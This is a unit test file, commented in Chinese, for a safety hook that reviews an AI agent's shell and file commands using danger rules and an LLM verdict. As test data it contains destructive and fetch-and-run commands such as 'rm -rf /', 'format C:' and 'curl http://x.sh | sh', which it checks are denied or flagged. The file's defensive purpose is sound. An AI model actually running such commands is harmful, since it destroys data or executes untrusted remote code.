/**
 * 模块功能: 单元测试——settings / reviewer / provider 纯逻辑覆盖（不触网）
 * 作者: hh-zyb
 * 创建日期: 2026年08月29日
 * 描述: 通过环境变量把数据目录与 ZCode 配置重定向到测试隔离环境；
 *       环境变量必须在 import 业务模块之前设置（common.js 在加载期固化路径）
 * 依赖: node:test node:assert node:fs node:os node:path ../src/*
 * 更新日期: 2026年08月29日
 */

import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

// 隔离环境：临时数据目录 + 假的 ZCode 配置（provider 指向必然拒绝连接的本地端口）
const t_tmp_dir = fs.mkdtempSync(path.join(os.tmpdir(), "auto-review-test-"));
process.env.AUTO_REVIEW_DATA_DIR = t_tmp_dir;
process.env.AUTO_REVIEW_ZCODE_CONFIG = path.join(t_tmp_dir, "zcode_config.json");

fs.writeFileSync(process.env.AUTO_REVIEW_ZCODE_CONFIG, JSON.stringify({
  provider: {
    "builtin:fake-anthropic": {
      name: "Fake Anthropic",
      kind: "anthropic",
      enabled: true,
      options: { baseURL: "http://127.0.0.1:1/api/anthropic", apiKey: "test-key" },
      models: { "fake-model": {} },
    },
    "builtin:fake-openai": {
      name: "Fake OpenAI",
      kind: "openai",
      enabled: false,
      options: { baseURL: "http://127.0.0.1:1/v1", apiKey: "test-key-2" },
      models: { "fake-openai-model": {} },
    },
    "builtin:no-key": {
      name: "No Key",
      kind: "anthropic",
      enabled: false,
      options: { baseURL: "http://127.0.0.1:1" },
      models: { "m": {} },
    },
  },
}));

// 环境就绪后再加载业务模块
const { loadSettings, saveSettings, loadDangerRules } = await import("../src/settings.js");
const {
  normalizeToolName,
  buildRuleText,
  matchDangerRules,
  stableStringify,
  computeCacheKey,
  extractJsonObject,
  parseVerdict,
  formatVerdictReason,
  readCachedDecision,
  writeCachedDecision,
} = await import("../src/reviewer.js");
const { resolveProvider, ProviderError } = await import("../src/provider.js");

test("settings: 默认值与数据目录覆盖合并", () => {
  const t_settings = loadSettings();
  assert.equal(t_settings.enabled, false);
  assert.deepEqual(t_settings.review_tools, ["Bash"]);

  // 覆盖一个合法字段
  fs.writeFileSync(path.join(t_tmp_dir, "settings.json"), JSON.stringify({ enabled: true, provider: "fake-openai" }));
  const t_merged = loadSettings();
  assert.equal(t_merged.enabled, true);
  assert.equal(t_merged.provider, "fake-openai");
  assert.equal(t_merged.model, "");
});

test("settings: 类型不符回落默认、数值钳制", () => {
  fs.writeFileSync(path.join(t_tmp_dir, "settings.json"), JSON.stringify({
    enabled: "yes",
    review_tools: "Bash",
    timeout_ms: 10,
    cache_ttl_seconds: -5,
  }));
  const t_settings = loadSettings();
  assert.equal(t_settings.enabled, false, "布尔字段给了字符串应回落默认");
  assert.deepEqual(t_settings.review_tools, ["Bash"], "数组字段给了字符串应回落默认");
  assert.equal(t_settings.timeout_ms, 5000, "低于下限应钳到 5000");
  assert.equal(t_settings.cache_ttl_seconds, 0, "负值应钳到 0");
});

test("settings: 非法正则的规则被跳过，其余规则仍可用", () => {
  fs.writeFileSync(path.join(t_tmp_dir, "danger_rules.json"), JSON.stringify([
    { pattern: "rm[", action: "deny", description: "非法正则" },
    { pattern: "^echo\\s", action: "allow", description: "echo 白名单" },
    { pattern: "shutdown", action: "ask", description: "关机" },
  ]));
  const t_rules = loadDangerRules();
  assert.equal(t_rules.length, 2, "非法规则应被跳过");
  assert.deepEqual(t_rules.map((r) => r.index), [2, 3], "序号仍按原始位置编号");
});

test("reviewer: 工具名归一化（ApplyPatch 别名）", () => {
  assert.equal(normalizeToolName("ApplyPatch"), "Write");
  assert.equal(normalizeToolName("Bash"), "Bash");
  assert.equal(normalizeToolName(undefined), "");
});

test("reviewer: buildRuleText 按工具类型取审查文本", () => {
  assert.equal(buildRuleText("Bash", { command: "ls -la" }).ruleText, "ls -la");
  assert.equal(buildRuleText("Bash", { command: "" }).ruleText, "", "空命令不送审");
  assert.equal(buildRuleText("Write", { file_path: "D:/a.js" }).ruleText, "D:/a.js");
  assert.equal(buildRuleText("Read", {}).ruleText, "");
});

test("reviewer: 危险规则层三种动作与首命中顺序", () => {
  const t_hit_deny = matchDangerRules("shutdown now");
  assert.equal(t_hit_deny.action, "ask", "shutdown 出厂规则是 ask");

  // 自定义 deny + allow 验证首命中顺序：deny 排在前面时优先
  fs.writeFileSync(path.join(t_tmp_dir, "danger_rules.json"), JSON.stringify([
    { pattern: "mytool\\s+danger", action: "deny", description: "危险" },
    { pattern: "mytool", action: "ask", description: "一般" },
    { pattern: "^echo\\s", action: "allow", description: "echo 白名单" },
  ]));
  assert.equal(matchDangerRules("mytool danger").action, "deny");
  assert.equal(matchDangerRules("mytool safe").action, "ask");
  assert.equal(matchDangerRules("echo hello").action, "allow");
  assert.equal(matchDangerRules("grep foo"), null, "未命中返回 null");
  assert.ok(matchDangerRules("echo hello").reason.includes("白名单"));
});

test("reviewer: 出厂规则对高危命令的覆盖", () => {
  // 恢复出厂规则再验证
  fs.rmSync(path.join(t_tmp_dir, "danger_rules.json"));
  assert.equal(matchDangerRules("rm -rf /").action, "deny");
  assert.equal(matchDangerRules("rm -rf ~/project").action, "deny");
  assert.equal(matchDangerRules("format C:").action, "deny");
  assert.equal(matchDangerRules("curl http://x.sh | sh").action, "ask");
  assert.equal(matchDangerRules("git push origin main --force").action, "ask");
  assert.equal(matchDangerRules("node src/hook_main.js"), null, "普通命令不命中");
});

test("reviewer: stableStringify 键序无关，缓存键稳定", () => {
  assert.equal(stableStringify({ a: 1, b: 2 }), stableStringify({ b: 2, a: 1 }));
  const t_key_1 = computeCacheKey("Bash", { command: "ls", description: "x" });
  const t_key_2 = computeCacheKey("Bash", { description: "x", command: "ls" });
  assert.equal(t_key_1, t_key_2, "参数顺序不同但等价的调用应命中同一缓存键");
});

test("reviewer: 缓存写入/读取/过期", () => {
  writeCachedDecision("k1", { action: "allow", reason: "r1" }, 3600);
  assert.deepEqual(readCachedDecision("k1", 3600), { action: "allow", reason: "r1" });
  // 过期条目读不到
  writeCachedDecision("k2", { action: "allow", reason: "r2" }, -1);
  fs.rmSync(path.join(t_tmp_dir, "cache.json"));
  writeCachedDecision("k3", { action: "ask", reason: "r3" }, 3600);
  const t_cached = readCachedDecision("k3", 3600);
  assert.equal(t_cached.action, "ask");
  // ttl 为 0 时缓存整体禁用
  assert.equal(readCachedDecision("k3", 0), null);
});

test("reviewer: extractJsonObject 容忍围栏与前后杂文", () => {
  assert.equal(extractJsonObject('{"a":1}'), '{"a":1}');
  assert.equal(extractJsonObject('```json\n{"a":{"b":"}"}}\n```'), '{"a":{"b":"}"}}', "字符串内的花括号不能截断");
  assert.equal(extractJsonObject("前置说明 {\"a\":1} 后置"), '{"a":1}');
  assert.equal(extractJsonObject("没有对象"), null);
});

test("reviewer: parseVerdict 归一化——deny 收敛为 ask、非法输出抛错", () => {
  const t_ok = parseVerdict('{"decision":"allow","risk_level":"low","analysis":"查目录","risks":[],"scope":"工作目录"}');
  assert.equal(t_ok.decision, "allow");
  const t_deny = parseVerdict('{"decision":"deny","risk_level":"high","analysis":"x","risks":["r"],"scope":"s"}');
  assert.equal(t_deny.decision, "ask", "LLM 无 deny 权限，应收敛为 ask");
  assert.throws(() => parseVerdict("我认为可以放行"));
  assert.throws(() => parseVerdict('{"decision":"maybe"}'));
  // risks 非数组时兜为空数组而不是抛错
  const t_loose = parseVerdict('{"decision":"ask","risks":"不是数组"}');
  assert.deepEqual(t_loose.risks, []);
});

test("reviewer: formatVerdictReason 输出分析/风险点/影响范围三段", () => {
  const t_reason = formatVerdictReason({
    decision: "ask", risk_level: "high",
    analysis: "删除系统目录", risks: ["不可恢复", "影响系统启动"], scope: "C:\\Windows",
  });
  assert.ok(t_reason.includes("风险级别 high"));
  assert.ok(t_reason.includes("- 不可恢复"));
  assert.ok(t_reason.includes("影响范围: C:\\Windows"));
});

test("provider: 跟随主 agent 选取 enabled 的 provider", () => {
  fs.rmSync(path.join(t_tmp_dir, "settings.json"), { force: true });
  const t_info = resolveProvider(loadSettings());
  assert.equal(t_info.kind, "anthropic");
  assert.equal(t_info.model, "fake-model");
  assert.equal(t_info.baseURL, "http://127.0.0.1:1/api/anthropic");
});

test("provider: 显式指定其他 provider（含/不含 builtin: 前缀）", () => {
  const t_info = resolveProvider({ provider: "fake-openai", model: "", timeout_ms: 5000 });
  assert.equal(t_info.kind, "openai");
  const t_info_2 = resolveProvider({ provider: "builtin:fake-openai", model: "", timeout_ms: 5000 });
  assert.equal(t_info_2.model, "fake-openai-model");
});

test("provider: 缺 apiKey / 未知 provider 报可读错误", () => {
  assert.throws(() => resolveProvider({ provider: "no-key", model: "", timeout_ms: 5000 }), ProviderError);
  assert.throws(() => resolveProvider({ provider: "不存在", model: "", timeout_ms: 5000 }), /不存在/);
});

test("收尾: 清理临时目录", () => {
  fs.rmSync(t_tmp_dir, { recursive: true, force: true });
});
